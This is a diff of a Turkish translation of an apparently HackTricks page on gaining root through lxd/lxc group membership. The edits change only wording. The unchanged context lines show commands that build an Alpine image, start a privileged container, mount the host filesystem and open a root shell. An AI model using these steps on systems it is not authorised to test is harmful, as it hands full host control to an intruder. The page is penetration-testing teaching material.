@@ -2,9 +2,9 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-_**lxd**_ **veya** _**lxc**_ **grubuna** dahilseniz root olabilirsiniz
+_**lxd**_ **veya** _**lxc** grubuna_ dahilseniz root olabilirsiniz
 
-## İnternet olmadan exploitation
+## İnternet olmadan Exploiting
 
 ### Method 1
 
@@ -12,7 +12,7 @@ lxd ile kullanmak üzere güvenilir bir repository'den bir alpine image indirebi
 Canonical, sitelerinde günlük build'ler yayımlar: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
 En yeni build'den hem **lxd.tar.xz** hem de **rootfs.squashfs** dosyalarını alın. (Directory adı tarihtir).
 
-Alternatif olarak distro builder'ı makinenize kurabilirsiniz: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (github'daki talimatları izleyin):
+Alternativelly bu distro builder'ı makinenize kurabilirsiniz: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (github talimatlarını izleyin):
 ```bash
 # Install requirements
 sudo apt update
@@ -35,7 +35,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 # Create the container - Beware of architecture while compiling locally.
 sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-**incus.tar.xz** (**Canonical repository** üzerinden indirdiyseniz **lxd.tar.xz**) ve **rootfs.squashfs** dosyalarını yükleyin, image'ı repo'ya ekleyin ve bir container oluşturun:
+**incus.tar.xz** (**lxd.tar.xz** if you downloaded from Canonical repository) ve **rootfs.squashfs** dosyalarını upload edin, image'ı repo'ya ekleyin ve bir container oluşturun:
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -51,7 +51,7 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 > [!CAUTION]
-> Bu hatayı bulursanız _**Error: No storage pool found. Please create a new storage pool**_\
+> _**Error: No storage pool found. Please create a new storage pool**_ hatasını bulursanız\
 > **`lxd init`** komutunu çalıştırın ve tüm seçenekleri varsayılan olarak ayarlayın. Ardından önceki komut bloğunu **tekrarlayın**
 
 Son olarak container'ı çalıştırabilir ve root elde edebilirsiniz:
@@ -62,7 +62,7 @@ lxc exec privesc /bin/sh
 ```
 ### Yöntem 2
 
-Bir Alpine image oluşturun ve `security.privileged=true` flag'i ile başlatın; böylece container'ın host filesystem ile root olarak etkileşime girmesini sağlayın.
+Bir Alpine image oluşturun ve `security.privileged=true` flag'ini kullanarak başlatın; böylece container, host filesystem ile root olarak etkileşime girmeye zorlanır.
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
